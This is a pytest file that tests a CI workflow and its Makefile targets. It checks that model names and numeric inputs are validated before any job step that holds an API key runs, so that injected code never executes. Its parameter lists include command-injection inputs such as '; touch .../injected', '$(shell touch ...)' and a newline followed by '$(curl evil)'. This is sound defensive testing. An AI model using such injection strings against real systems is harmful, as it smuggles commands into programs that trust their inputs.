"""The jobs of the Manual runs workflow that hold the API key (issue 130).

The model name reaches `make kills-claude` only after a check, and through
the environment, so a value can never become shell code. The `long-job` job
takes one model only, and its numbers only as digits. Neither job restores
or saves the uv cache.
"""

import os
import subprocess
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = ROOT / ".github" / "workflows" / "manual-runs.yml"


def workflow_job(name: str) -> str:
    """The text of one job of the workflow, up to the next job."""
    text = WORKFLOW.read_text()
    lines = text[text.index(f"\n  {name}:\n") + 1 :].split("\n")
    end = next(
        (i for i in range(1, len(lines)) if lines[i][:2] == "  " and lines[i][2:3].strip()),
        len(lines),
    )
    return "\n" + "\n".join(lines[:end])


def claude_job() -> str:
    """The text of the workflow's `claude` job, up to the next job."""
    return workflow_job("claude")


def long_job_job() -> str:
    """The text of the workflow's `long-job` job."""
    return workflow_job("long-job")


def kills_claude(
    model: str, tmp_path: Path, *, from_environment: bool = False
) -> tuple[int, bool, bool]:
    """Run `make kills-claude` with a stub docker.

    Returns the exit code, whether docker ran, and whether injected code ran.
    """
    stub = tmp_path / "bin"
    stub.mkdir(exist_ok=True)
    called = tmp_path / "docker-called"
    (stub / "docker").write_text(f"#!/bin/sh\ntouch {called}\nexit 1\n")
    (stub / "docker").chmod(0o755)
    done = subprocess.run(  # noqa: S603 - fixed program, the model is the input under test
        [  # noqa: S607
            "make",
            "--no-print-directory",
            "kills-claude",
            *([] if from_environment else [f"KILLS_MODEL={model}"]),
        ],
        cwd=ROOT,
        env={
            **os.environ,
            "PATH": f"{stub}:{os.environ['PATH']}",
            "DOCKER_GID": "0",
            **({"KILLS_MODEL": model} if from_environment else {}),
        },
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )
    return done.returncode, called.exists(), (tmp_path / "injected").exists()


@pytest.mark.parametrize(
    "model",
    [
        "",
        "claude-haiku-5-5; touch {tmp}/injected",
        'claude-x"; touch {tmp}/injected; "',
        "gpt-4",
        "claude-Haiku",
        "claude-",
        "claude-haiku-5-5\nanything else",
    ],
)
def test_a_model_name_that_is_not_an_id_stops_make_before_docker(
    model: str, tmp_path: Path
) -> None:
    code, docker_ran, injected = kills_claude(model.format(tmp=tmp_path), tmp_path)
    assert code != 0
    assert not docker_ran
    assert not injected


@pytest.mark.parametrize("from_environment", [False, True], ids=["command-line", "environment"])
@pytest.mark.parametrize(
    "model",
    ["claude-x$(shell touch {tmp}/injected)", "claude-x\n$(shell touch {tmp}/injected)"],
    ids=["make-function", "make-function-on-a-second-line"],
)
def test_make_code_in_the_model_name_runs_nothing(
    model: str, from_environment: bool, tmp_path: Path
) -> None:
    """make takes the value as raw text, so its own functions in it never run."""
    code, docker_ran, injected = kills_claude(
        model.format(tmp=tmp_path), tmp_path, from_environment=from_environment
    )
    assert not injected
    assert code != 0
    assert not docker_ran


def test_a_model_id_reaches_the_kill_runner_through_the_environment(tmp_path: Path) -> None:
    stub = tmp_path / "bin"
    stub.mkdir()
    seen = tmp_path / "uv-env"
    (stub / "docker").write_text("#!/bin/sh\nexit 0\n")
    # Only the two variables: the environment can hold a key.
    (stub / "uv").write_text(
        "#!/bin/sh\n"
        "printf 'KILLS_MODEL=%s\\nKILLS_PROVIDER=%s\\n'"
        f' "$KILLS_MODEL" "$KILLS_PROVIDER" > {seen}\n'
    )
    for program in ("docker", "uv"):
        (stub / program).chmod(0o755)
    done = subprocess.run(
        ["make", "--no-print-directory", "kills-claude", "KILLS_MODEL=claude-haiku-5-5"],  # noqa: S607
        cwd=ROOT,
        env={**os.environ, "PATH": f"{stub}:{os.environ['PATH']}", "DOCKER_GID": "0"},
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )
    assert done.returncode == 0, done.stderr
    env = seen.read_text().splitlines()
    assert "KILLS_MODEL=claude-haiku-5-5" in env
    assert "KILLS_PROVIDER=claude" in env


def check_step(job: str | None = None, name: str = "Check the model name") -> str:
    """The shell script of one check step of a job: the claude job's model check by default."""
    job = claude_job() if job is None else job
    step = job[job.index(f"- name: {name}") :]
    script = step[step.index("run: |\n") + len("run: |\n") :]
    script = script[: script.index("\n      - ")]
    return "\n".join(line.removeprefix("          ") for line in script.splitlines())


def run_check(script: str, env: dict[str, str]) -> bool:
    """Whether a check step's script passes, run as GitHub runs it."""
    done = subprocess.run(  # noqa: S603 - the workflow's own check
        ["bash", "-e", "-c", script],  # noqa: S607
        env={**os.environ, **env},
        capture_output=True,
        text=True,
        check=False,
        timeout=10,
    )
    return done.returncode == 0


def test_the_job_with_the_key_checks_the_model_before_anything_else() -> None:
    job = claude_job()
    steps = job[job.index("    steps:\n") :]
    assert steps.index("- name: Check the model name") < steps.index("actions/checkout@")


def test_the_long_job_job_checks_the_model_and_the_numbers_before_anything_else() -> None:
    job = long_job_job()
    steps = job[job.index("    steps:\n") :]
    assert steps.index("- name: Check the model name") < steps.index("actions/checkout@")
    assert steps.index("- name: Check the numbers") < steps.index("actions/checkout@")
    assert steps.index("- name: Check the numbers") < steps.index("secrets.")


@pytest.mark.parametrize(
    ("model", "passes"),
    [
        ("claude-haiku-5-5", True),
        ("claude-fable-5-2", False),
        ("claude-haiku-5-5-x", False),
        ("claude-opus-5-5", False),
        ("", False),
        ("claude-haiku-5-5\nclaude-x$(curl evil)", False),
    ],
)
def test_the_long_job_job_takes_only_the_harnesss_model(model: str, passes: bool) -> None:
    assert run_check(check_step(long_job_job()), {"MODEL": model}) is passes


@pytest.mark.parametrize(
    ("value", "passes"),
    [("", True), ("1500000", True), ("1e6", False), ("-1", False), ("15 00", False),
     ("1\n$(touch {tmp}/x)", False)],
)  # fmt: skip
@pytest.mark.parametrize("name", ["LONG_JOB_TOKEN_BUDGET", "LONG_JOB_JOBS"])
def test_the_long_job_jobs_numbers_are_digits_or_nothing(
    name: str, value: str, passes: bool, tmp_path: Path
) -> None:
    given = value.format(tmp=tmp_path)
    other = "LONG_JOB_JOBS" if name == "LONG_JOB_TOKEN_BUDGET" else "LONG_JOB_TOKEN_BUDGET"
    script = check_step(long_job_job(), "Check the numbers")
    assert run_check(script, {name: given, other: ""}) is passes
    assert not (tmp_path / "x").exists()


@pytest.mark.parametrize(
    ("model", "passes"),
    [
        ("claude-haiku-5-5", True),
        ("claude-fable-5-2", True),
        ("", False),
        ("claude-", False),
        ("gpt-4", False),
        ("claude-haiku-5-5\nclaude-x$(curl evil)", False),
        ("claude-x; echo", False),
    ],
)
def test_the_workflows_check_takes_only_a_whole_model_id(model: str, passes: bool) -> None:
    done = subprocess.run(  # noqa: S603 - the workflow's own check, run as GitHub runs it
        ["bash", "-e", "-c", check_step()],  # noqa: S607
        env={**os.environ, "MODEL": model},
        capture_output=True,
        text=True,
        check=False,
        timeout=10,
    )
    assert (done.returncode == 0) is passes, done.stderr


@pytest.mark.parametrize("job", [claude_job, long_job_job], ids=["claude", "long-job"])
def test_the_job_with_the_key_uses_no_uv_cache(job: Any) -> None:
    text = job()
    setup = text[text.index("astral-sh/setup-uv@") :]
    setup = setup[: setup.index("\n      - ")]
    assert "enable-cache: false" in setup


# `make long-job-claude`: the run's refusals first, then the harness's one model


def long_job_claude(
    tmp_path: Path, model: str | None, *, check_exit: int = 0, mode: str | None = None
) -> tuple[int, list[str], bool]:
    """Run `make long-job-claude` with a stub uv and a stub docker.

    Returns the exit code, the programs called in order with their first
    arguments, and whether injected code ran. The stub uv records whether
    the provider was claude when it ran; it exits `check_exit` for the check.
    """
    stub = tmp_path / "bin"
    stub.mkdir(exist_ok=True)
    called = tmp_path / "called"
    (stub / "docker").write_text(f'#!/bin/sh\necho "docker $1" >> {called}\nexit 0\n')
    (stub / "uv").write_text(
        "#!/bin/sh\n"
        f'echo "uv $3 $4 $5 provider=$LONG_JOB_PROVIDER phase=$LONG_JOB_PHASE" >> {called}\n'
        f'case "$4 $5" in "scripts/long_job_keyed.py check") exit {check_exit};; esac\n'
        "exit 0\n"
    )
    for program in ("docker", "uv"):
        (stub / program).chmod(0o755)
    done = subprocess.run(  # noqa: S603 - fixed program, the model is the input under test
        [  # noqa: S607
            "make",
            "--no-print-directory",
            "long-job-claude",
            *([] if model is None else [f"LONG_JOB_MODEL={model}"]),
        ],
        cwd=ROOT,
        env={
            **{k: v for k, v in os.environ.items() if not k.startswith("LONG_JOB_")},
            **({} if mode is None else {"LONG_JOB_MODE": mode}),
            "PATH": f"{stub}:{os.environ['PATH']}",
            "DOCKER_GID": "0",
        },
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )
    lines = called.read_text().splitlines() if called.exists() else []
    return done.returncode, lines, (tmp_path / "injected").exists()


def test_make_long_job_claude_runs_the_check_first_and_stops_on_a_refusal(tmp_path: Path) -> None:
    code, called, _ = long_job_claude(tmp_path, "claude-haiku-5-5", check_exit=1)
    assert code != 0
    assert called == ["uv python scripts/long_job_keyed.py check provider=claude phase="]


@pytest.mark.parametrize(
    "model",
    [None, "", "claude-fable-5-2", "claude-haiku-5-5-x", "claude-haiku-5-5; touch {tmp}/injected"],
)
def test_make_long_job_claude_refuses_another_model_before_docker(
    tmp_path: Path, model: str | None
) -> None:
    given = None if model is None else model.format(tmp=tmp_path)
    code, called, injected = long_job_claude(tmp_path, given)
    assert code != 0
    assert called == ["uv python scripts/long_job_keyed.py check provider=claude phase="]
    assert not injected


def test_make_long_job_claude_refuses_mode_must_fail_before_docker(tmp_path: Path) -> None:
    """Mode must-fail runs only as the list's entry, with its control, its edit and its judge."""
    code, called, _ = long_job_claude(tmp_path, "claude-haiku-5-5", mode="must-fail")
    assert code != 0
    assert called == ["uv python scripts/long_job_keyed.py check provider=claude phase="]


def test_make_code_in_the_long_jobs_model_name_runs_nothing(tmp_path: Path) -> None:
    code, called, injected = long_job_claude(
        tmp_path, f"claude-haiku-5-5$(shell touch {tmp_path}/injected)"
    )
    assert (code != 0, injected) == (True, False)
    assert [line.split()[0] for line in called] == ["uv"]


def test_make_long_job_claude_starts_the_long_and_claude_stack_then_the_harness(
    tmp_path: Path,
) -> None:
    code, called, _ = long_job_claude(tmp_path, "claude-haiku-5-5")
    recipe = (ROOT / "Makefile").read_text().split("\nlong-job-claude:", 1)[1].split("\n\n")[0]

    assert code == 0
    assert called == [
        "uv python scripts/long_job_keyed.py check provider=claude phase=",
        "docker compose",
        "uv pytest -v --tb=short provider=claude phase=control",
    ]
    # No prerequisite: nothing starts before the check.
    assert recipe.split("\n", 1)[0].strip() == ""
    assert "-f docker-compose.long.yml -f docker-compose.claude.yml up --build --wait" in recipe
    assert "pytest -v --tb=short tests/long_job" in recipe
    assert "LONG_JOB_SEED" not in recipe and "LONG_JOB_TOKEN_BUDGET" not in recipe
